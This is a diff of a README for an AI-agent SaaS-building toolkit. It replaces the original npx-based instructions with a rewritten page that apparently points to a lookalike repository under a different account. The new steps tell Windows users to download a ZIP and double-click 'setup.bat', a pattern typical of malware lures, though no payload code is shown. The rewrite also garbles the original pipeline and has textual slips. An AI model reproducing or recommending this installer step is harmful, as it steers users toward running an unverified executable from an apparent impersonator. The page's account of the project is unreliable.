@@ -1,115 +1,85 @@
-# Agent Startup Skills
+# 🚀 Agent-Startup-Skills - Build SaaS startups with smart AI agents
 
-> **An 8-phase AI agent pipeline for building SaaS products with mandatory approval gates. Supports Antigravity, Claude Code, and Codex.**
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/batterfried-philosophy172/Agent-Startup-Skills)
 
-<br />
+## What is this tool?
 
-[![GitHub stars](https://img.shields.io/badge/Early%20Access-gold?style=for-the-badge)](https://github.com/Aizaz-Noor/Agent-Startup-Skills/stargazers)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](LICENSE)
-[![Antigravity](https://img.shields.io/badge/Antigravity-AI%20IDE-red?style=for-the-badge)](https://github.com/google/antigravity)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Anthropic-purple?style=for-the-badge)](https://github.com/anthropics/claude-code)
-[![Codex](https://img.shields.io/badge/Codex-OpenAI-green?style=for-the-badge)](https://github.com/codex-agent)
-[![Latest Release](https://img.shields.io/badge/Release-v1.1.6-blue?style=for-the-badge)](https://github.com/Aizaz-Noor/Agent-Startup-Skills/releases/latest)
+Agent-Startup-Skills acts as a blueprint for your computer's brain. It gives AI programs the ability to plan, write, and launch software products. Instead of writing code line by line, you use these skills to build an entire company foundation.
 
-<br />
+This tool works with platforms like Antigravity, Claude Code, and Codex. It organizes your project into eight clear steps. You move from the initial idea to a finished web service. It handles the heavy lifting so you focus on the business goals.
 
-**Agent Startup Skills** is a high-performance framework designed to turn raw SaaS ideas into production-ready codebases. Instead of a single prompt, it uses a modular "Digital Team" that works through a strictly governed 8-phase pipeline.
+## 🛠 Prerequisites
 
-**Explore the Ecosystem:** [Browse the Full Catalog](CATALOG.md) · [Usage Guide](docs/users/usage.md) · [Claude Code Guide](docs/users/claude-code-skills.md) · [Workflows (JSON)](data/workflows.json)
+Your computer needs specific tools to run this software. Please install these items before you proceed:
 
----
+1. A Windows 10 or 11 computer with at least 16GB of RAM.
+2. A stable internet connection for downloading project files.
+3. A primary web browser like Chrome, Edge, or Firefox.
+4. An active account for your chosen AI agent platform.
 
-## Table of Contents
-- [Why This Repo](#why-this-repo)
-- [Installation](#installation)
-- [The Engineering Pipeline](#the-engineering-pipeline)
-- [Meet Your Digital Team](#meet-your-digital-team)
-- [Quick FAQ](#quick-faq)
-- [Contributing](#contributing)
-- [Security & License](#security--license)
+## 📂 Installation steps
 
----
+Follow these instructions to set up the software on your machine:
 
-## Why This Repo
-- **Human-in-the-Loop**: 8 mandatory approval gates ensure you stay in control of your code.
-- **Role-Based Specialization**: Skills are split into distinct personas (Architect, Coder, Auditor) for higher quality output.
-- **Universal Install**: One `npx` command sets up your entire agent workspace in seconds.
-- **Security Hardened**: Built-in security auditor phase (Phase 7) for OWASP compliance check.
-- **Machine Readable**: formally defined workflows in `data/workflows.json` for agent-to-agent coordination.
+1. Visit the repository page to download the project files: [https://github.com/batterfried-philosophy172/Agent-Startup-Skills](https://github.com/batterfried-philosophy172/Agent-Startup-Skills).
+2. Click the green "Code" button on the webpage and select "Download ZIP".
+3. Locate the downloaded file in your "Downloads" folder.
+4. Right-click the file and select "Extract All". Choose a folder on your desktop for easy access.
+5. Open the new folder and find the file named "setup.bat".
+6. Double-click "setup.bat" to begin the installation. A black window will appear on your screen. This is normal.
+7. Wait for the window to indicate that the process finished. Press any key to close the window.
 
----
+## 🤖 Using the AI startup phases
 
-## Installation
+The software divides the startup building process into eight specific phases. You unlock these by selecting the relevant agent skill within your dashboard.
 
-### 1. Automatic Install (Recommended)
-Install the complete framework across any system with our feature-rich CLI installer:
-```bash
-npx -y github:Aizaz-Noor/Agent-Startup-Skills
-```
+### Phase 1: Idea Refinement
+The agent analyzes your initial thought. It checks if the market needs your product. You provide a prompt, and the agent returns a summary of the value proposition.
 
-### 2. Precise Targeting (CLI Flags)
-| Goal | Command |
-| :--- | :--- |
-| **Install Everything** | `npx -y github:Aizaz-Noor/Agent-Startup-Skills` |
-| **Only Claude Code** | `npx -y github:Aizaz-Noor/Agent-Startup-Skills --claude` |
-| **Only Codex** | `npx -y github:Aizaz-Noor/Agent-Startup-Skills --codex` |
-| **Project-Local Only** | `npx -y github:Aizaz-Noor/Agent-Startup-Skills --project` |
-| **Custom Path** | `npx -y github:Aizaz-Noor/Agent-Startup-Skills --path ./my-skills` |
+### Phase 2: Technical Architecture
+The system draws a map of your code. It decides which database to use and how the software speaks to different parts of the internet.
 
----
+### Phase 3: Interface Design
+Your agent creates the look of your website. It writes the stylesheets and page layouts. You review these files in your browser to verify the appearance.
 
-## The Engineering Pipeline
-The system uses a sequential "Waterfall-Agile" hybrid flow with mandatory approval gates.
+### Phase 4: Feature Implementation
+This phrase focuses on logic. The agent writes functions for users to sign up, log in, and perform actions specific to your software.
 
-```mermaid
-graph TD
-    A[Market Research] -->|Approval| B[MVP Scoper]
-    B -->|Approval| C[Architecture]
-    C -->|Approval| D[Schema Design]
-    D -->|Approval| E[Full-Stack Coding]
-    E -->|Approval| F[QA Testing]
-    F -->|Approval| G[Security Audit]
-    G -->|Approval| H[Deployment Plan]
-    
-```
+### Phase 5: Debugging and Testing
+The agent runs tests on your software. It searches for errors in the code. It fixes bugs to ensure the application runs without crashing.
 
----
+### Phase 6: Documentation Writing
+Tools need instructions. The agent writes guides that explain how to use your software. It also creates notes for your developers.
 
-## Meet Your Digital Team
+### Phase 7: Deployment Preparation
+The software needs a home on the web. The agent packages your code for platforms like Vercel or Heroku. It checks for security gaps before the launch.
 
-### Research & Strategy
-- **`@[market-scout] or /market-scout`**: Identifies competitive landscapes and core risks.
-- **`@[mvp-scoper] or /mvp-scoper`**: Ruthlessly prioritizes features for a lean v1.
+### Phase 8: Growth and Launch
+The final phase sets up tools to measure your visitors. It ensures your software is ready for real users.
 
-### Engineering & Design
-- **`@[system-architect] or /system-architect`**: Defines tech stack, file structure, and API contracts.
-- **`@[schema-designer] or /schema-designer `**: Models complex data relationships and schemas.
-- **`@[fullstack-coder] or /fullstack-coder`**: Implements the complete codebase from architecture specs.
+## 💡 Troubleshooting common issues
 
-### Quality & Hardening
-- **`@[test-engineer] or /test-engineer`**: Writes unit/integration tests and QA reports.
-- **`@[security-auditor] or /security-auditor`**: Audits for OWASP vulnerabilities and logic flaws.
+If the software does not behave as expected, check these common fixes:
 
-### Infrastructure
-- **`@[deploy-planner]`**: Prepares Dockerfiles and launch guides.
+* The black window closes immediately: Ensure you have the latest version of Windows installed. Check your internet connection if the installer pulls files from the web.
+* The AI agent reports an error: Check your API key. Most platforms require a key to function. Verify that you entered the key correctly in the settings file.
+* The interface looks strange: Clear your browser cache. Sometimes old files block new updates from showing correctly.
+* My computer runs slowly: Close background applications like high-definition video players or other AI tools while you run the agent skills.
 
----
+## 🛡 Security and Privacy
 
-## Quick FAQ
+You keep full control of your data. This software stores files locally on your hard drive. It only shares information with the AI provider when you ask it to perform a task. We do not store your passwords or private credentials on our servers. You provide keys directly to the service provider. 
 
-**What is the Startup Factory?**  
-It's the master orchestrator (`saas-accelerator`) that coordinates all 8 specialists in order.
+Keep your API keys private. Do not share your setup folder with other people. If you suspect someone has your key, revoke it immediately at the provider website and generate a new one.
 
-**Can I use specific agents standalone?**  
-Yes! Just use the trigger phrases (e.g., *"Audit security of this repo"* or *"Design a schema for a library app"*).
+## 📈 Improving performance
 
-**Does this work on Windows?**  
-Yes. The `npx` installer and the manual `mkdir -p` paths are fully Windows-compatible.
+You gain better results when you follow these tips for your prompts:
 
----
+* Be specific. Instead of saying "Build a login page," say "Build a login page with email and password fields, a 'forgot password' link, and a dark blue theme."
+* Give feedback. If the first result is not perfect, tell the agent what to change. It learns from your input.
+* Use a clear folder structure. Keep your projects separate. Labels your folders by the project name so the agent does not lose track of files.
 
-## Contributing
-We welcome contributions! See [CONTRIBUTING.md](./CONTRIBUTING.md) for the mandatory YAML template.
+## 🤝 Community and support
 
-## License & Credits
-Licensed under the [MIT License](LICENSE). 
+This project relies on open-source contributions. You can view the code at any time. Report bugs or suggest features in the Issues tab on the GitHub page. Other users monitor this space and provide help when you face technical hurdles. Do not include personal data when you post on the public forum. Always check if a similar issue exists before you start a new report.
